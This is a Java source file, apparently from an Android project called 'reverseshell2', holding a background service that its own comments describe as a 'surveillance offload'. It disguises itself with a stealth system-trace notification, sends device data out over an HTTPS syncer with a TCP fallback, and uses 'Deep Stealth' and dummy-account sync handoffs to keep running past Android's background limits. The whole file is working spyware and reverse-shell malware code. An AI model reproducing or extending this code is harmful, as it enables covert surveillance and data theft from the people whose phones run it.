package com.example.reverseshell2;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

public class mainService extends Service {
    static String TAG ="mainServiceClass";
    private static mainService instance;

    public static mainService getContext() {
        return instance;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
    }

    public static void sendData(String data) {
        if (tcpConnection.out != null) {
            new Thread(() -> {
                try {
                    tcpConnection.out.write(data.getBytes("UTF-8"));
                } catch (Exception e) {
                    Log.e(TAG, "Failed to send data: " + e.getMessage());
                }
            }).start();
        }
    }

    private static final int PULSE_TIMEOUT_MS = 600000; // 10 Minutes
    private android.os.Handler pulseHandler = new android.os.Handler(android.os.Looper.getMainLooper());
    private boolean isPulsing = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;
        
        if ("ACTION_START_PULSE".equals(action)) {
            startPulse();
        } else {
            // Backup start (legacy fallback)
            startPulse();
        }
        
        return START_NOT_STICKY; // Preserving daily budget by not being sticky
    }

    private void startPulse() {
        if (isPulsing) return;
        isPulsing = true;
        Log.d(TAG, "Starting Pulse cycle (10 min budget)");

        // 1. Initialize Stealth Branding
        NotificationHelper.createNotificationChannel(this);
        android.app.Notification notification = NotificationHelper.getSystemTraceNotification(this);

        // 2. Start FGS with dataSync type (Android 10-15 requirement)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            startForeground(NotificationHelper.NOTIFICATION_ID, notification, 
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NotificationHelper.NOTIFICATION_ID, notification);
        }

        // 3. Execute the Sync (The Actual surveillance offload)
        new Thread(() -> {
            android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_BACKGROUND);
            try {
                // Initialize modern HTTPS pipeline
                DataSyncer syncer = new DataSyncer(getApplicationContext());
                syncer.performSync();
                
                // Legacy TCP fallback (if needed)
                new jumper(getApplicationContext()).init();
                
                Log.d(TAG, "Pulse sync logic completed — waiting for timeout or manual stop");
            } catch (Exception e) {
                Log.e(TAG, "Pulse sync failed: " + e.getMessage());
            }
        }).start();

        // 4. Set the Pulse Kill-Switch (Safety for Android 15 budget)
        pulseHandler.postDelayed(this::stopPulse, PULSE_TIMEOUT_MS);
    }

    private void stopPulse() {
        Log.d(TAG, "Pulse cycle complete. Shutting down Brawn to preserve daily budget.");
        isPulsing = false;
        stopForeground(true);
        stopSelf();
    }

    // Android 15/16 specific: Handle system-enforced timeouts
    public void onTimeout(int startId, int fgsType) {
        if (android.os.Build.VERSION.SDK_INT >= 35) { 
            if (fgsType == android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC) {
                Log.w(TAG, "Android 15+ timeout reached. Engaging Handoff Logic.");
                try {
                    // Check Android 16 Private Space Status
                    android.os.UserManager um = (android.os.UserManager) getSystemService(android.content.Context.USER_SERVICE);
                    boolean isLocked = false;
                    
                    if (android.os.Build.VERSION.SDK_INT >= 30) {
                        for (android.os.UserHandle handle : um.getUserProfiles()) {
                            if (um.isQuietModeEnabled(handle)) {
                                isLocked = true;
                                break;
                            }
                        }
                    }

                    if (isLocked) {
                        Log.d(TAG, "Private Space locked. Entering Deep Stealth.");
                        // Let the system kill the service silently, no wake-up alarms.
                    } else {
                        Log.d(TAG, "Space active. Triggering Emergency Sync Handoff.");
                        android.accounts.AccountManager am = android.accounts.AccountManager.get(this);
                        android.accounts.Account[] accounts = am.getAccountsByType(DummyAuthenticator.ACCOUNT_TYPE);
                        if (accounts.length > 0) {
                            android.content.ContentResolver.requestSync(accounts[0], DummyProvider.AUTHORITY, new android.os.Bundle());
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Handoff failed: " + e.getMessage());
                } finally {
                    stopPulse();
                }
            }
        }
    }
}
